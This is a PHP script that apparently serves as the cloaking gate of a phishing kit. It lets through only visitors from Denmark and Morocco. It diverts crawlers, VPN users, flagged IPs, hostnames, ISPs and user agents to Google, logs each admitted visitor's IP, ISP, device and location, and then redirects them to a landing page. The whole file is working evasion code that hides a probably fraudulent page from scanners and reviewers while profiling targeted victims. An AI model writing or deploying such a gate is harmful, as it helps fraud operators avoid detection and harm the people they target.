<?php

error_reporting(0);
date_default_timezone_set('Europe/Copenhagen'); // Denmark timezone
session_start();

// Allowed countries: Denmark (DK) and Morocco (MA)
$allowed_countries = ['dk', 'ma'];

require './includes/plugins/CrawlerDetect/Fixtures/AbstractProvider.php';
require './includes/plugins/CrawlerDetect/Fixtures/AbstractReff.php';
require './includes/plugins/CrawlerDetect/Fixtures/Crawlers.php';
require './includes/plugins/CrawlerDetect/Fixtures/Exclusions.php';
require './includes/plugins/CrawlerDetect/Fixtures/Headers.php';
require './includes/plugins/CrawlerDetect/Fixtures/Headerspam.php';
require './includes/plugins/CrawlerDetect/Fixtures/SpamReferrers.php';
require './includes/plugins/CrawlerDetect/CrawlerDetect.php';
require './includes/plugins/CrawlerDetect/ReferralSpamDetect.php';
require './includes/alego.php';
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;

// ----------------------------
$_SESSION['ip']         = $ip         = setIP();
$geo_info = getIP($ip);
$vpn      = get_vpn($ip);
$_SESSION['country']    = $country    = $geo_info['countryname'];
$_SESSION['ccode']      = $ccode      = $geo_info['countrycode'];
$_SESSION['region']     = $region     = $geo_info['region'];
$_SESSION['city']       = $city       = $geo_info['city'];
$_SESSION['device']     = $device     = getOS();
$_SESSION['browser']    = $browser    = getBrowser();
$_SESSION['isp']        = $isp        = getISP($ip);
$full_date    = date("Y-m-d H:i:s");
$hostname     = gethostbyaddr($ip);
$ua           = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocker_ua   = get_data("useragent");
$blocker_ip   = get_data("ip");
$blocker_hn   = get_data("hostname");
$blocker_isp  = get_data("isp");
$blocker_uaf  = get_data("ua-full");
$onetime      = get_data("onetime");
$bad_bots     = get_data("bots");
$whitelist    = get_data("whitelist");
//---------------------------------------
$CrawlerDetect = new CrawlerDetect;
$referrer = new ReferralSpamDetect;


// Check if country is allowed (Denmark or Morocco only)
if (!in_array(strtolower($ccode), $allowed_countries)) {
    $status = "bot";
    $detect = "Country denied - Only DK/MA allowed";
}


foreach ($onetime as $onetimeaccess) {
    if (sha1($ip) == $onetimeaccess) {
        $onetime_status = "OneTimeBot";
        $detect = "Onetime";
    }
}

foreach ($blocker_ua as $useragent) {
    if (substr_count($ua, strtolower($useragent)) > 0 or $ua == "" or $ua == " " or $ua == "    ") {
        $status = "bot";
        $detect = "User Agent";
    }
}

foreach ($blocker_uaf as $uanew) {
    if ($ua == strtolower($uanew)) {
        $status = "bot";
        $detect = "User Agent";
    }
}

foreach ($blocker_ip as $ipbot) {
    if(preg_match('/' . $ipbot . '/',$ip)){
        $status = "bot";
        $detect = "IP Range";
    }
}

foreach ($blocker_hn as $hostnamebot) {
    if (substr_count($hostname, $hostnamebot) > 0) {
        $status = "bot";
        $detect = "Hostname";
    }
}

foreach ($blocker_isp as $ispbot) {
    if (substr_count($isp, $ispbot) > 0) {
        $status = "bot";
        $detect = "ISP";
    }
}

if ($vpn === 'Y' && $status !== 'bot') {
    $is_whitelisted = false;

    $ispPattern     = '/(CLOUDFLARENET|Cloudflare,\s*Inc|Akamai|AKAMAI-AS)/i';
    $browserPattern = '/Safari/i';
    $devicePattern  = '/(iPhone|Mac\s*OS\s*X)/i';

    if (
        preg_match($ispPattern, $isp) &&
        preg_match($browserPattern, $browser) &&
        preg_match($devicePattern, $device)
    ) {
        $is_whitelisted = true;
    }

    if (!$is_whitelisted) {
        $status = 'BOT';
        $detect = 'VPN/Proxy';
    }
}


if($CrawlerDetect->isCrawler()) {
    $status = "bot";
    $detect = "Bot Crawler";
}

if($onetime_status == "OneTimeBot") {
    $line = "date: $full_date | ip: $ip | hostname: $hostname | isp: $isp | browser: $browser | device: $device | country: $country | Bot: $detect";
    $existing = file_exists('logs/x_bot_visitor.txt') ? file_get_contents('logs/x_bot_visitor.txt') : '';
    file_put_contents('logs/x_bot_visitor.txt', $line . PHP_EOL . $existing);
    blocked("Google");
}

if($status == "bot") {
    $line = "date: $full_date | ip: $ip | hostname: $hostname | isp: $isp | browser: $browser | device: $device | country: $country | Bot: $detect";
    $existing = file_exists('logs/x_bot_visitor.txt') ? file_get_contents('logs/x_bot_visitor.txt') : '';
    file_put_contents('logs/x_bot_visitor.txt', $line . PHP_EOL . $existing);
    blocked("Google");
}

$line = "date: $full_date | ip: $ip | hostname: $hostname | isp: $isp | browser: $browser | device: $device | country: $country";
$existing = file_exists('logs/x_real_visitor.txt') ? file_get_contents('logs/x_real_visitor.txt') : '';
file_put_contents('logs/x_real_visitor.txt', $line . PHP_EOL . $existing);
$_SESSION['active'] = $ip;

if(!isset($_SESSION['visitor_id'])){
    $visitorId = bin2hex(random_bytes(16));
    $_SESSION['visitor_id'] = $visitorId;
}

// Redirect to landing page
header("location: templates/landing.htm");
exit();
?>
